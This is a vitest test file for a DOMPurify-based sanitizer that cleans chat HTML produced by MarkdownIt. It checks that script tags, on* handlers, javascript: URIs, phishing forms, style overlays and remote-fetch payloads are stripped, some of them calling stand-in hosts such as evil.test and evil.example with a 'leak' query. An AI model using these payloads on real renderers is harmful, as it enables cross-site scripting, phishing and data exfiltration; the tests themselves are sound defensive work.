/**
 * sanitizeChatHtml is the gate between MarkdownIt (html: true) and the chat/trace HTML sinks.
 * DOMPurify needs a window, so these run under vitest/jsdom.
 */
import { describe, it, expect } from 'vitest';
import {
    createChatHtmlSanitizer,
    sanitizeChatHtml,
} from '../../src/lib/client/features/chat/message-segments/sanitize-chat-html';

const withSampleWidget = createChatHtmlSanitizer({
    tags: ['x-sample-widget'],
    attrs: { 'x-sample-widget': ['sample-id'] },
});

describe('sanitizeChatHtml — XSS stripping', () => {
    it('removes <script> tags', () => {
        const out = sanitizeChatHtml('<p>hi</p><script>alert(1)</script>');
        expect(out).toContain('hi');
        expect(out.toLowerCase()).not.toContain('<script');
    });

    it('removes on* event-handler attributes', () => {
        const out = sanitizeChatHtml('<img src="x" onerror="alert(1)">');
        expect(out).not.toMatch(/onerror/i);
    });

    it('removes javascript: URIs from href', () => {
        const out = sanitizeChatHtml('<a href="javascript:alert(1)">click</a>');
        expect(out).not.toMatch(/javascript:/i);
    });
});

describe('sanitizeChatHtml — ordinary markdown preserved', () => {
    it('keeps formatting, code, tables, and http(s) links', () => {
        const html =
            '<p><strong>bold</strong> <em>i</em> <code>x</code></p>' +
            '<table><thead><tr><th>h</th></tr></thead><tbody><tr><td>a</td></tr></tbody></table>' +
            '<a href="https://example.com">l</a>';
        const out = sanitizeChatHtml(html);
        expect(out).toContain('<strong>');
        expect(out).toContain('<em>');
        expect(out).toContain('<code>');
        expect(out).toContain('<table>');
        expect(out).toContain('<td>');
        expect(out).toContain('href="https://example.com"');
    });
});

describe('custom elements — default allow-list is empty', () => {
    it('drops a custom element when nothing is registered', () => {
        const out = sanitizeChatHtml('<x-sample-widget sample-id="1">z</x-sample-widget>');
        expect(out.toLowerCase()).not.toContain('<x-sample-widget');
    });
});

describe('forbidden-by-default tags', () => {
    it('strips <img> by default', () => {
        const out = sanitizeChatHtml('<p>a</p><img src="https://example.com/x.png" alt="x">');
        expect(out.toLowerCase()).not.toContain('<img');
    });

    it('keeps <img> when the allow-list lists it, still without on* handlers', () => {
        const withImages = createChatHtmlSanitizer({ tags: ['img'], attrs: {} });
        const out = withImages('<img src="https://example.com/x.png" alt="x" onerror="alert(1)">');
        expect(out).toContain('src="https://example.com/x.png"');
        expect(out).not.toMatch(/onerror/i);
    });
});

describe('custom elements — registered through the allow-list', () => {
    it('preserves a registered element and its allowed attribute', () => {
        const out = withSampleWidget('<x-sample-widget sample-id="abc-123"></x-sample-widget>');
        expect(out).toContain('x-sample-widget');
        expect(out).toContain('sample-id="abc-123"');
    });

    it('strips attributes not allowed for the registered element', () => {
        const out = withSampleWidget(
            '<x-sample-widget sample-id="1" srcdoc="x" style="position:fixed;inset:0" extra-attr="y"></x-sample-widget>'
        );
        expect(out).toContain('sample-id="1"');
        expect(out).not.toContain('srcdoc');
        expect(out).not.toMatch(/style=/i);
        expect(out).not.toContain('extra-attr');
    });

    it('strips an unregistered custom element (allow-list, not prefix-list)', () => {
        const out = withSampleWidget('<x-other-widget data-x="1">z</x-other-widget>');
        expect(out.toLowerCase()).not.toContain('<x-other-widget');
    });

    it('strips on* handlers even on a registered element', () => {
        const out = withSampleWidget('<x-sample-widget sample-id="1" onclick="alert(1)"></x-sample-widget>');
        expect(out).toContain('x-sample-widget');
        expect(out).not.toMatch(/onclick/i);
    });
});

describe('sanitizeChatHtml — phishing and overlay hardening', () => {
    it('strips forms and credential inputs', () => {
        const out = sanitizeChatHtml(
            '<form action="https://evil.example/c" method="POST"><input name="user"><button>Sign in</button></form>'
        );
        expect(out.toLowerCase()).not.toContain('<form');
        expect(out.toLowerCase()).not.toContain('<input');
        expect(out.toLowerCase()).not.toContain('<button');
    });

    it('strips inline style overlays', () => {
        const out = sanitizeChatHtml(
            '<div style="position:fixed;inset:0;z-index:2147483647;background:#fff">FAKE LOGIN</div>'
        );
        expect(out).not.toMatch(/style=/i);
        expect(out).toContain('FAKE LOGIN');
    });

    it('strips remote img tags (exfil/tracking channel)', () => {
        const out = sanitizeChatHtml('<img src="https://evil.example/b?d=leak">');
        expect(out.toLowerCase()).not.toContain('<img');
        expect(out).not.toContain('evil.example');
    });
});

describe('sanitizeChatHtml — no remote fetch on render', () => {
    const payloads: Array<[string, string]> = [
        ['<style> element after text', 'ok<style>body{background:url(https://evil.test/x)}</style>'],
        ['video poster', '<video poster="https://evil.test/p"></video>'],
        ['audio src', '<audio src="https://evil.test/a"></audio>'],
        ['video source', '<video><source src="https://evil.test/v"></video>'],
        ['picture srcset', '<picture><source srcset="https://evil.test/s"></picture>'],
        ['svg image href', '<svg><image href="https://evil.test/i"/></svg>'],
        ['svg use href', '<svg><use href="https://evil.test/u#x"/></svg>'],
        ['table background', '<table background="https://evil.test/b"><tr><td>x</td></tr></table>'],
    ];

    it.each(payloads)('strips %s', (_name, html) => {
        expect(sanitizeChatHtml(html)).not.toContain('evil.test');
    });

    it('keeps the surrounding text and table content', () => {
        expect(sanitizeChatHtml('ok<style>p{}</style>')).toBe('ok');
        expect(sanitizeChatHtml('<table background="https://evil.test/b"><tr><td>x</td></tr></table>')).toContain(
            '<td>x</td>'
        );
    });
});

describe('sanitizeChatHtml — lifting a media tag lifts its URL attribute', () => {
    it('keeps srcset on an allowed img and strips it by default', () => {
        const html = '<img srcset="https://cdn.test/a.png 1x" alt="a">';
        expect(createChatHtmlSanitizer({ tags: ['img'], attrs: {} })(html)).toContain('srcset=');
        expect(sanitizeChatHtml(html)).not.toContain('cdn.test');
    });

    it('keeps poster on an allowed video', () => {
        const out = createChatHtmlSanitizer({ tags: ['video'], attrs: {} })(
            '<video poster="https://cdn.test/p.png"></video>'
        );
        expect(out).toContain('poster=');
    });

    it('keeps background and style forbidden even when media tags are allowed', () => {
        const out = createChatHtmlSanitizer({ tags: ['img', 'video'], attrs: {} })(
            '<table background="https://cdn.test/b"><tr><td style="color:red">x</td></tr></table>'
        );
        expect(out).not.toContain('background=');
        expect(out).not.toContain('style=');
    });
});

describe('sanitizeChatHtml — table alignment style', () => {
    const cell = (tag: string, style: string) =>
        sanitizeChatHtml(`<table><tr><${tag} style="${style}">a</${tag}></tr></table>`);

    it('keeps markdown-style alignment on th and td', () => {
        const out = sanitizeChatHtml(
            '<table><tr><th style="text-align:center">a</th><td style="text-align:right">b</td></tr></table>'
        );
        expect(out).toContain('<th style="text-align:center">');
        expect(out).toContain('<td style="text-align:right">');
    });

    it('keeps alignment with spaces and a trailing semicolon', () => {
        expect(cell('td', 'text-align: left ;')).toContain('style="text-align: left ;"');
    });

    it.each([
        ['extra declaration', 'td', 'text-align:center;background:url(x)'],
        ['uppercase property', 'td', 'TEXT-ALIGN:center'],
        ['url value', 'td', 'text-align:url(x)'],
        ['escape', 'td', 'text-align:center\\;'],
        ['other property', 'td', 'color:red'],
    ])('strips style: %s', (_name, tag, style) => {
        expect(cell(tag, style)).not.toContain('style=');
    });

    it('strips alignment style on a div', () => {
        expect(sanitizeChatHtml('<div style="text-align:center">a</div>')).not.toContain('style=');
    });
});

describe('createChatHtmlSanitizer — per-tag attribute lists on lifted built-in tags', () => {
    const img = '<img src="https://x/y.png" loading="lazy" width="3" alt="a">';

    it('keeps only listed attributes', () => {
        const out = createChatHtmlSanitizer({ tags: ['img'], attrs: { img: ['alt'] } })(img);
        expect(out).toContain('alt="a"');
        expect(out).not.toContain('src=');
        expect(out).not.toContain('loading=');
        expect(out).not.toContain('width=');
    });

    it('keeps listed src and still removes javascript: URIs', () => {
        const sanitize = createChatHtmlSanitizer({ tags: ['img'], attrs: { img: ['alt', 'src'] } });
        const out = sanitize(img);
        expect(out).toContain('alt="a"');
        expect(out).toContain('src="https://x/y.png"');
        expect(sanitize('<img src="javascript:alert(1)" alt="a">')).not.toContain('src=');
    });

    it('keeps default attributes when there is no entry', () => {
        const out = createChatHtmlSanitizer({ tags: ['img'], attrs: {} })(
            '<img src="https://x/y.png" alt="a" srcset="https://x/z.png 2x">'
        );
        expect(out).toContain('src=');
        expect(out).toContain('alt=');
        expect(out).toContain('srcset=');
    });

    it('keeps the lifted srcset even when the list omits it', () => {
        const out = createChatHtmlSanitizer({ tags: ['img'], attrs: { img: ['alt'] } })(
            '<img alt="a" srcset="https://x/z.png 2x">'
        );
        expect(out).toContain('srcset=');
    });

    it('scopes the list to its own sanitizer instance', () => {
        const restricted = createChatHtmlSanitizer({ tags: ['img'], attrs: { img: ['alt'] } });
        const open = createChatHtmlSanitizer({ tags: ['img'], attrs: {} });
        expect(restricted(img)).not.toContain('src=');
        expect(open(img)).toContain('src=');
        expect(restricted(img)).not.toContain('src=');
    });
});
